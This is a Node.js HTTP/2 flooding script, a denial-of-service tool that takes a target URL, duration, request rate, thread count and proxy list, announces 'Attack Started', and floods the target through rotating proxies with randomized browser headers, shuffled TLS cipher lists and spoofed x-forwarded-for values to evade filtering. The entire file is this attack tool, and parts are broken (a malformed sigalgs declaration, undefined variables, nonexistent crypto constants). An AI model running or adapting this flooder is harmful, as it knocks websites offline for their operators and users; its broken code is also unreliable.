process.on('uncaughtException', function(er) {
    //console.log(er);
});
process.on('unhandledRejection', function(er) {
    //console.log(er);
});

process.on("SIGHUP", () => {
    return 1;
  })
process.on("SIGCHILD", () => {
    return 1;
  });

require("events").EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);
const gradient = require('gradient-string');
const cluster = require("cluster");
const crypto = require("crypto");
const http2 = require("http2");
const http = require('http');
const net = require("net");
const tls = require("tls");
const url = require("url");
const fs = require("fs");
var path = require("path");
var fileName = __filename;
var file = path.basename(fileName);

if (process.argv.length < 7){
    console.log('\x1b[36mnode ' + file + '\x1b[37m \x1b[31murl time requests threads proxy\x1b[37m'); 
    process.exit();
}

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
defaultCiphers[2],
defaultCiphers[1],
defaultCiphers[0],
defaultCiphers.slice(3) 
].join(":");

const sigalgs = 
'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512'
		'ecdsa_secp256r1_sha256',
		'ecdsa_brainpoolP256r1tls13_sha256',
		'ecdsa_brainpoolP384r1tls13_sha384',
		'ecdsa_brainpoolP512r1tls13_sha512',
		'ecdsa_sha1',
		'ed25519',
		'ed448',
		'rsa_pkcs1_sha1',
		'rsa_pkcs1_sha256',
		'rsa_pkcs1_sha384',
		'rsa_pss_pss_sha256',
		'rsa_pss_pss_sha384',
		'rsa_pss_pss_sha512',
		'sm2sig_sm3',           
		'ecdsa_secp384r1_sha384',
		'ecdsa_secp521r1_sha512',
		'rsa_pss_rsae_sha256',
		'rsa_pss_rsae_sha384',
		'rsa_pss_rsae_sha512',
		'rsa_pkcs1_sha512';
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
const secureOptions = 
crypto.constants.SSL_OP_NO_TICKET |
crypto.constants.SSL_OP_NO_SSLv2 |
crypto.constants.SSL_OP_NO_SSLv3 |
crypto.constants.SSL_OP_NO_COMPRESSION |
crypto.constants.SSL_OP_NO_RENEGOTIATION | 
crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
crypto.constants.SSL_OP_TLSEXT_PADDING | 
crypto.constants.SSL_OP_ALL |
crypto.constants.SSL_OP_NO_SSLv2 |
crypto.constants.SSL_OP_NO_SSLv3 |
crypto.constants.SSL_OP_NO_TLSv1 |
crypto.constants.SSL_OP_NO_TLSv1_2 |
crypto.constants.TLS_OP_NO_TLS_1_1 |
crypto.constants.TLS_OP_NO_TLS_1_0 |
crypto.constants.SSL_OP_NO_TLSv1_1 |
crypto.constants.SSL_OP_NO_TICKET | 
crypto.constants.SSL_OP_SSLREF2_REUSE_ |
crypto.constants.SSL_OP_TLS_BLOCK_ |
crypto.constants.SSL_OP_TLS_D5_BUG |
crypto.constants.PADDING_BUG |
crypto.constants.SSL_OP_TLS_ROLLBACK_BUG |
crypto.constants.SSL_OP_SSLREF2_REUSE_CERT_TYPE_BUG |
crypto.constants.SSL_OP_CISCO_ANYCONNECT |
crypto.constants.SSL_OP_ALL |
crypto.constants.SSL_OP_MICROSOFT_BIG_SSLV3_BUFFER | 
crypto.constants.SSL_OP_NO_QUERY_MTU |
crypto.constants.ALPN_ENABLED |
crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
crypto.constants.SSL_OP_COOKIE_EXCHANGE |
crypto.constants.SSL_OP_PKCS1_CHECK_1 |
crypto.constants.SSL_OP_PKCS1_CHECK_2 |
crypto.constants.SSL_OP_SINGLE_DH_USE |
crypto.constants.SSL_OP_SINGLE_ECDH_USE |
crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
crypto.constants.SSLcom |
crypto.constants.SSL_OP_NO_TLSv1 |
crypto.constants.SSL_OP_NO_TLSv1_1 |
crypto.constants.ALPN_ENABLED |
crypto.constants.SSL_OP_NO_RENEGOTIATION |
crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
crypto.constants.SSL_OP_COOKIE_EXCHANGE |
crypto.constants.SSL_OP_PKCS1_CHECK_1 |
crypto.constants.SSL_OP_PKCS1_CHECK_2 |
crypto.constants.SSL_OP_SINGLE_DH_USE |
crypto.constants.SSL_OP_SINGLE_ECDH_USE |
crypto.constants.SSLcom |
crypto.constants.SSL_OP_TLSEXT_PADDING |
crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION; 


const secureProtocol = "TLS_client_method";
const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

const headers = {};
 function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 

	function generatecipher() {
	  cipper = cplist[Math.floor(Math.random() * cplist.length)]
	}

 function randomCharacters(length) {
    output = ""
    for (let count = 0; count < length; count++) {
        output += randomElement(characters);
    }
    return output;
}
 
const args = {
    target: process.argv[2],
    time: process.argv[3],
    rate: process.argv[4],
    threads: process.argv[5],
    proxy: process.argv[6],
    cookie: process.argv[7] || undefined
 }

const accept_header = [
		'*/*',
		'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
		'application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
		'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*',
		'image/avif,image/webp,*/*',
		'image/webp,*/*',
		'image/png,image/*;q=0.8,*/*;q=0.5',
		'image/webp,image/png,image/svg+xml,image/*;q=0.8,video/*;q=0.8,*/*;q=0.5',
		'application/octet-stream; charset=utf-8',
		'image/png,image/svg+xml,image/*;q=0.8,video/*;q=0.8,*/*;q=0.5',
		'image/avif,image/webp,image/apng,image/*,*/*;q=0.8',
		"application/javascript; charset=utf-8",
		'image/png,image/svg+xml,image/*;q=0.8, */*;q=0.5',
		'text/*;q=0.3, text/html;q=0.7, text/html;level=1,',
		'text/css,*/*;q=0.1',
		'text/html; charset=UTF-8',
		'text/html;level=2;q=0.4, */*;q=0.5',
		'text/javascript; charset=UTF-8',
		'application/x-www-form-urlencoded',
		'content-type,x-tawk-token',
		'text/css',
		'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1',
		'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
		'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
		'text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8',
		'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5',
		'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
		'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
		'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*',
		'text/html, application/xhtml+xml, image/jxr, */*',
		'application/javascript, */*;q=0.8',
		'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
		'image/svg+xml',
		'text/html, text/plain; q=0.6, */*; q=0.1',
		'application/graphql, application/json; q=0.8, application/xml; q=0.7',
],

		cplist = [
		"ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
		"ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
		"AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
		"EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
		"HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
		"ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",		
		"RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
		"DHE-RSA-AES128-CCM",
		"ECDHE-ECDSA-CHACHA20-POLY1305",
		"DHE-PSK-AES128-GCM-SHA256",
		"DHE-RSA-AES256-CCM",
		"DHE-PSK-AES128-CCM8",
		"DHE-DSS-AES128-GCM-SHA256",
		"TLS_AES_128_GCM_SHA256",
		"DHE-PSK-AES256-GCM-SHA384",
		"DHE-PSK-AES256-CCM8",
		"DHE-RSA-AES128-CCM8",
		"ECDHE-ECDSA-AES256-GCM-SHA384",
		"DHE-PSK-AES128-CCM",
		"TLS_AES_256_GCM_SHA384",
		"DHE-RSA-AES128-GCM-SHA256",
		"DHE-RSA-AES256-GCM-SHA384",
		"ECDHE-ECDSA-AES256-CCM",
		"ECDHE-ECDSA-AES128-GCM-SHA256",
		"DHE-PSK-AES256-CCM",
		"TLS_AES_128_CCM_SHA256",
		"ECDHE-ECDSA-AES128-CCM8",
		"DHE-RSA-CHACHA20-POLY1305",
		"ECDHE-RSA-AES256-GCM-SHA384",
		"DHE-DSS-AES256-GCM-SHA384",
		"ECDHE-ECDSA-AES256-CCM8",
		"ECDHE-RSA-CHACHA20-POLY1305",
		"ECDHE-ECDSA-AES128-CCM",
		"ECDHE-RSA-AES128-GCM-SHA256",
		"EECDH:!SSLv2:!SSLv3:!TLSv1:!TLSv1.1:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
		"EECDH:!SSLv2:!SSLv3:!TLSv1:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
		"EECDH:!SSLv2:!SSLv3:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
		"EECDH:!SSLv2:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
		"EECDH:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
		"ALL:!aNULL:!ADH:!eNULL:!LOW:!EXP:RC4+RSA:+HIGH:+MEDIUM",
		"ALL:!aNULL:!eNULL",
		"EECDH:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
		"EECDH:!SSLv2:!aNULL:!RC4:!ADH:!eNULL:!LOW:!MEDIUM:!EXP:+HIGH",
		"ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
		"ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA",
		"TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
		"options2.TLS_AES_128_GCM_SHA256:options2.TLS_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA256:options2.TLS_RSA_WITH_AES_128_GCM_SHA256:options2.TLS_RSA_WITH_AES_256_CBC_SHA",
		":ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK",
		"ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
		"AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
		"EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
		"HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
		"ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
	];
cache_header = [
		'max-age=604800',
		'proxy-revalidate',
		'public, max-age=0',
		'max-age=315360000',
		'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
		'max-age=0, no-cache, no-store',
		's-maxage=604800',
		'max-stale',
		'public, immutable, max-age=31536000',
		'must-revalidate',
		'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
		'max-age=31536000,public,immutable',
		'max-age=31536000,public',
		'min-fresh',
		'public, max-age=12706231',
		'private',
		'public',
		's-maxage',
		'no-cache, no-store, max-age=0, must-revalidate',
		'no-cache',
		'no-cache, no-transform',
		'max-age=2592000',
		'no-store',
		'no-transform',
		'max-age=31557600',
		'stale-if-error',
		'only-if-cached',
		'max-age=0',
		'must-understand, no-store',
		'max-age=86400, enforce',
		'max-age=31536000; includeSubDomains',
		'public, max-age=14400',
		'max-age=31536000; includeSubDomains; preload',
		'max-age=120',
		'max-age=0,no-cache,no-store,must-revalidate',
		'public, max-age=604800, immutable',
		'max-age=0, must-revalidate, private',
		'max-age=0, private, must-revalidate',
		'private, must-revalidate',
		'max-age=604800, stale-while-revalidate=86400',
		'max-stale=3600',
		'public, max-age=2678400',
		'min-fresh=600',
		'public, max-age=30672000',
		'max-age=31536000, immutable',
		'max-age=604800, stale-if-error=86400',
		'public, max-age=604800',
		'no-cache, no-store,private, max-age=0, must-revalidate',
		'o-cache, no-store, must-revalidate, pre-check=0, post-check=0',
		'public, s-maxage=600, max-age=60',
		'public, max-age=31536000',
		'max-age=14400, public',
		'max-age=14400',
		'public, s-maxage=600, max-age=60',
		'no-store, no-cache, must-revalidate',
		'no-cache, no-store,private, s-maxage=604800, must-revalidate',
		'no-cache, no-store,private, max-age=604800, must-revalidate'
],
language_header = [
	'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5',
    'ru-RU,ru;q=0.9',
    'ru-RU,ru;q=0.8',
    'ru-RU,ru;q=0.7',
    'ru-RU,ru;q=0.6',
    'ru-RU,ru;q=0.5',
    'en-US,en;q=0.9', 
    'en-US,en;q=0.8', 
    'en-US,en;q=0.7', 
    'en-US,en;q=0.6', 
    'en-US,en;q=0.5', 
    		"ko-KR",
		"en-US",
		"zh-CN",
		"zh-TW",
		"ja-JP",
		"en-GB",
		"en-AU",
		'en-GB,en-US;q=0.9,en;q=0.8',
	   "en-GB,en;q=0.5",
		"en-CA",
		'en-UK, en, de;q=0.5',
		"en-NZ",
		'en-GB,en;q=0.6',
		"en-ZA",
		"en-IN",
		"en-PH",
		"en-GB,en",
		"en-SG",
		"en-HK",
		"en-GB,en;q=0.8",
		'en-GB,en;q=0.9',
		" en-GB,en;q=0.7",
		"*",
		"en-US,en;q=0.5",
		'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
		"utf-8, iso-8859-1;q=0.5, *;q=0.1",
		"fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
		"en-GB, en-US, en;q=0.9",
		"de-AT, de-DE;q=0.9, en;q=0.5",
		"cs;q=0.5",
		"da, en-gb;q=0.8, en;q=0.7",
		"he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
		"en-US,en;q=0.9",
                "de-CH",
		"de-CH;q=0.7",
                "de",	
		"tr",
    '*'
],
dest_header = [
    'audio',
    'audioworklet',
    'document',
    'embed',
    'empty',
    'font',
    'frame',
    'iframe',
    'image',
    'manifest',
    'object',
    'paintworklet',
    'report',
    'script',
    'serviceworker',
    'sharedworker',
    'style',
    'track',
    'video',
    'worker',
    'xslt'
 ],
mode_header = [
    'cors',
    'navigate',
    'no-cors',
    'same-origin',
    'websocket'
 ],
encoding_header = [
	
		'*',
		'gzip',
		'gzip, deflate',
		'br',
		'br;q=1.0, gzip;q=0.8, *;q=0.5',
		'gzip',
		'gzip;q=1.0, identity; q=0.5, *;q=0',
		'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
		'compress;q=0.5, gzip;q=1.0',
		'identity',
		'gzip, compress',
                'gzip, compress, br',
                'deflate, gzip;q=1.0, *;q=0.5',
		'compress, deflate',
		'compress',
		'gzip, deflate',
		'gzip, deflate, br',
		'deflate',
		'gzip, deflate, lzma, sdch',
		'deflate'
]
site_header = [
    'cross-site',
    'same-origin',
    'same-site',
    'none'
]

var proxies = readLines(args.proxy);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster){
    const dateObj = new Date();
        for (let i = 0; i < process.argv[5]; i++){
            cluster.fork();
        }
		console.clear()
        console.log("\x1b[31mAttack Started \x1b[31m<\x1b[37m/\x1b[31m>\x1b[37m");
        setTimeout(() => {
        }, process.argv[5] * 1000);
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
        }
    } else {setInterval(runFlooder) }

class NetSocket {
     constructor(){}
 
HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
     const connection = net.connect({
     host: options.host,
     port: options.port,
     allowHalfOpen: true,
     writable: true,
     readable: true
     });
 
     connection.setTimeout(options.timeout * 10000);
     connection.setKeepAlive(true, 10000);
     connection.setNoDelay(true);
     connection.on("connect", () => {
     connection.write(buffer);
     });

     connection.on("data", chunk => {
     const response = chunk.toString("utf-8");
     const isAlive = response.includes("HTTP/1.1 200");
     if (isAlive === false) {
     connection.destroy();
     return callback(undefined, "403");
     }
     return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "403");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "403");
     });
 }}

 const Socker = new NetSocket();
 headers[":method"] = "GET";
 headers[':authority'] = parsed.host;
 headers[":path"] = parsedTarget.path;
 headers['referer'] = target;
 headers[":scheme"] = "https";
 headers["accept"] = accept_header[Math.floor(Math.random() * accept_header.length)];
 headers["accept-encoding"] = encoding_header[Math.floor(Math.random() * encoding_header.length)];
 headers["accept-language"] = language_header[Math.floor(Math.random() * language_header.length)];
 headers["cache-control"] = cache_header[Math.floor(Math.random() * cache_header.length)];
 headers["cookie"] = process.argv[7];
 headers["sec-ch-ua"] = '"Chromium";v="108", "Opera GX";v="94", "Google Chrome";v="96", "Chromium";v="96", "Not A;Brand";v="99"';
 headers["sec-ch-ua-mobile"] = "?0";
 headers["sec-ch-ua-platform"] = "Windows";
 headers["sec-fetch-dest"] = dest_header[Math.floor(Math.random() * dest_header.length)];
 headers["sec-fetch-mode"] = mode_header[Math.floor(Math.random() * mode_header.length)];
 headers["sec-fetch-site"] = site_header[Math.floor(Math.random() * site_header.length)];
 headers["sec-fetch-user"] = "?1";
 headers["upgrade-insecure-requests"] = "1";
 headers["user-agent"] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36';
 headers["x-requested-with"] = "XMLHttpRequest";

 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     headers[":authority"] = parsedTarget.host
     headers["x-forwarded-for"] = parsedProxy[0];
     headers["x-forwarded-proto"] = "https";
     const proxyOptions = {
     host: parsedProxy[0],
     port: parsedProxy[1],
     address: parsedTarget.host + ":443",
     timeout: 15
     };

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
         connection.setKeepAlive(true, 60000);
         connection.setNoDelay(true);

         const settings = {
            enablePush: false,
            initialWindowSize: 1073741823
        };

         const tlsOptions = {
            port: 443,
            ALPNProtocols: [
                'h2', 'http/1.1', 'http/1.3', 'http/2', 'h3', 'http/2+quic/43', 'http/2+quic/44', 'http/2+quic/45'
            ],
            secure: true,
            ciphers: ciphers,
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            decodeEmails: false,
            gzip: true,
            rejectUnauthorized: false,
            followAllRedirects: true,
            servername: url.hostname,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            secureOptions: secureOptions,
            secureContext: secureContext,
            secureProtocol: secureProtocol
        };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 
         
         tlsConn.allowHalfOpen = true;
         tlsConn.setNoDelay(true);
         tlsConn.setKeepAlive(true, 60 * 1000);
         tlsConn.setMaxListeners(0);
 
         const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          },
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
         });
 
         client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          });

         client.setMaxListeners(0);
         client.settings(settings);

         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.rate; i++) {
                    const request = client.request(headers)

                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });

                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
 
         client.on("error", error => {
             client.destroy();
             connection.destroy();
             return
         });
     });
 }

 const KillScript = () => process.exit();
 setTimeout(KillScript, args.time * 1000);